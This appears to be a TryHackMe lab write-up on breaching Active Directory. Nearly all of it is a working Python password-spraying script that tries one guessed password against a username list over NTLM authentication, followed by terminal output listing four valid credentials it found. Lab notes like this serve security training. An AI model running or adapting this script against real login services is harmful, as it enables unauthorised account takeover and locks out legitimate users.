
We have a list of possible user names and a possible password (from OSINT)


script to password spray
```python
#!/usr/bin/python3

import requests
from requests_ntlm import HttpNtlmAuth

HTTP_AUTH_FAILED_CODE = 401
HTTP_AUTH_SUCCEED_CODE = 200

user_file = './usernames.txt'
fqdn = 'za.tryhackme.com'
password = 'Changeme123'
attackurl = 'http://ntlmauth.za.tryhackme.com'

users = []
with open(user_file,'r') as file:
  for line in file.readlines():
    users.append(line.replace("\r", "").replace("\n", ""))

print ("Starting passwords spray attack using the following password: " + password)
count = 0
for user in users:
  response = requests.get(attackurl, auth=HttpNtlmAuth(fqdn + "\\" + user, password))
  if (response.status_code == HTTP_AUTH_SUCCEED_CODE):
    print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
    count += 1
  elif (response.status_code == HTTP_AUTH_FAILED_CODE):
    print ("[-] Failed login with Username: " + user)

print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")
```

```sh
┌──(kali㉿kali)-[~/thm/breaching-ad]
└─$ ./ntlm-password-spray.py
Starting passwords spray attack using the following password: Changeme123
/usr/lib/python3/dist-packages/ntlm_auth/rc4.py:18: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  algo = algorithms.ARC4(key)
[-] Failed login with Username: anthony.reynolds
[-] Failed login with Username: samantha.thompson
[-] Failed login with Username: dawn.turner
[-] Failed login with Username: frances.chapman
[-] Failed login with Username: henry.taylor
[-] Failed login with Username: jennifer.wood
[+] Valid credential pair found! Username: hollie.powell Password: Changeme123
[-] Failed login with Username: louise.talbot
[+] Valid credential pair found! Username: heather.smith Password: Changeme123
[-] Failed login with Username: dominic.elliott
[+] Valid credential pair found! Username: gordon.stevens Password: Changeme123
[-] Failed login with Username: alan.jones
[-] Failed login with Username: frank.fletcher
[-] Failed login with Username: maria.sheppard
[-] Failed login with Username: sophie.blackburn
[-] Failed login with Username: dawn.hughes
[-] Failed login with Username: henry.black
[-] Failed login with Username: joanne.davies
[-] Failed login with Username: mark.oconnor
[+] Valid credential pair found! Username: georgina.edwards Password: Changeme123
[*] Password spray attack completed, 4 valid credential pairs found
```
